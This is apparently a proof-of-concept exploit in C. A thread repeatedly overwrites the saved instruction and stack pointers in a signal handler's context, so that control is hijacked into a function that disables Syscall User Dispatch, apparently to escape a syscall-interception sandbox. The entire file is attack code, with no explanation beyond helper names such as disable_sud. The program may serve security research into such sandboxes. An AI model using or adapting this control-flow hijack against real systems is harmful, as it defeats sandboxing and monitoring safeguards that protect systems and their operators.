#define _GNU_SOURCE
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <ucontext.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <thread>


#include "_libattack.h"


#define ALTSTACK_SIZE (1024*1024*32)
#define PAGE_SIZE (4096)
#define PAGE_MASK (~(PAGE_SIZE - 1))

ucontext_t* glob_cont = NULL;

void win() {
    printf("entered win\n");
    disable_sud();
    sud_test();
    exit(0);
}

void* attack(void* args) {
    char *stack = (char*)malloc(ALTSTACK_SIZE + PAGE_SIZE*2);
    stack = (char*)((uint64_t)(stack + PAGE_SIZE) & PAGE_MASK);

    while(glob_cont==NULL);
    while(true){
        glob_cont->uc_mcontext.gregs[REG_RIP] = (uint64_t)win;
        glob_cont->uc_mcontext.gregs[REG_RSP] = (uint64_t)(stack + ALTSTACK_SIZE - PAGE_SIZE);
    }



    return 0;
}


void handle_sigfpe(int signo, siginfo_t* info, void* ucontextv) {
    printf("cont %p info %p\n", ucontextv, info);
    glob_cont = (ucontext_t*)ucontextv;
    sleep(2);    
}

int main(int argc, char **argv) {
    struct sigaction act = {};
    act.sa_sigaction = handle_sigfpe;
    act.sa_flags |= SA_SIGINFO|SA_ONSTACK;
    sigaction(SIGFPE, &act, NULL);

    pthread_t t;
    pthread_create(&t, NULL, attack, NULL);

    kill(getpid(), SIGFPE);

    return 0;
}